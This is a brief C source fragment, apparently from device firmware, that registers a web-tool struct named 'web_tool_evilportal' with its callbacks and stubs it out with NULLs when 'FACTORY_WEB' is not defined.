const web_tool_t web_tool_evilportal = { CAPS, handle, evilportal_tick, NULL, evilportal_stop };

#else /* !FACTORY_WEB */
const web_tool_t web_tool_evilportal = { NULL, NULL, NULL, NULL, NULL };
#endif /* FACTORY_WEB */